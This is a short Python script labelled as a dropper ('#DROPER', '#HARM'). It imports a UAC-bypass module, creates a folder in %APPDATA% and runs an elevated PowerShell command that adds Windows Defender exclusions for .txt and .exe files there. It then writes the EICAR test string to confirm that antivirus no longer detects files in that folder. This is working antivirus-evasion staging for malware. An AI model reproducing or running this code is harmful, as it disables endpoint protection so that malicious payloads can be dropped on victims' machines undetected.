#DROPER
#HARM
import time
import base64
import os
import bypass_uac

def eicar_test():
    global completeName
    file_name = "eicar.txt"

    completeName = os.path.join(save_path, file_name)
    print(completeName)
    b64_eicar = "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo="
    with open(completeName, 'w') as f:
        f.write(base64.b64decode(b64_eicar).decode('utf-8'))
    if wait_and_detect_eicar():
        return True
    else:
        return False

def wait_and_detect_eicar():
    #if ecair.txt exist return true
    time.sleep(2)
    try :
        with open(completeName) as f:
            f.read()
        print(u"Pas detecté")
        return True
    except :
        print("Detecté")
        return False


def main():
    global save_path
    path = os.environ["appdata"]
    directory = "projet"
    save_path = os.path.join(path, directory)
    print(save_path)
    os.mkdir(save_path)
    os.popen(f""" powershell -Command Start-Process powershell -Verb runas 'Add-MpPreference -ExclusionPath "{save_path}\\*.txt","{save_path}\\*.exe"' """)
    time.sleep(10)
    if eicar_test():
        print("Super ca marche")
        return True
    else:
        return False

#main()
